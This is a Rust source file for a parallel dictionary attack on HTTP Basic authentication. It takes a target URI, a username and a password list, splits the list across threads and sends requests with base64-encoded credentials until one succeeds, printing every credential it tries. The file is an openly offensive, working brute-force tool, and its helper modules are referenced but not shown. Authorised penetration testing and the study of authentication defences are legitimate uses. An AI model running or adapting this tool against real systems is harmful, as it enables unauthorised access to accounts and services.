pub mod utils {
    pub mod connection;
    pub mod console;
    pub mod file;
    pub mod parser;
}

use rayon::prelude::*;
use std::collections::HashMap;
use std::process;
use utils::connection::{http_req, BruteResponse};
use utils::console::{print_result, print_welcome, read_line};
use utils::file::file_to_vec;
use utils::parser::parse;

fn main() {
    print_welcome();
    let command = read_line().unwrap();
    let parsed_command = parse(&command);
    if parsed_command.is_err() {
        let error = &parsed_command.unwrap_err();
        println!("err. code {}: {}", &error.code, &error.description)
    } else {
        let unwrappedd = parsed_command.unwrap_or(HashMap::new());
        let uri = unwrappedd.get("uri").unwrap();
        let username = unwrappedd.get("username").unwrap();
        let filename = unwrappedd.get("dictionary").unwrap();

        let vec = file_to_vec(&filename).unwrap();

        let chunked_items: Vec<Vec<String>> = vec
            .chunks(vec.len() / 7)
            .into_iter()
            .map(|chunk| chunk.to_vec())
            .collect();

        let result = chunked_items
            .par_iter()
            .enumerate()
            .map(|(i, chunck)| process_dictionary(i, username, uri, chunck))
            .reduce_with(|r1, r2| if r1.is_err() { r1 } else { r2 });

        match result.unwrap() {
            Ok(_) => (),
            Err(e) => println!("{}", e),
        }
    }
}

fn process_dictionary(
    idx: usize,
    username: &str,
    uri: &str,
    arc: &Vec<String>,
) -> Result<BruteResponse, String> {
    for password in arc.to_vec() {
        let auth = base64::encode(format!("{}:{}", &username, &password));
        let status = http_req(uri, &auth, username, &password);
        if status.is_ok() {
            let result = status.unwrap();

            print_result(
                idx,
                &result.message,
                &result.uri,
                &result.username,
                &result.password,
                &result.base64,
            );
            process::exit(0x0100);
        } else {
            println!("thread {} | {}:{} ", idx, &username, &password);
        }
    }
    Err("No password found".to_string())
}
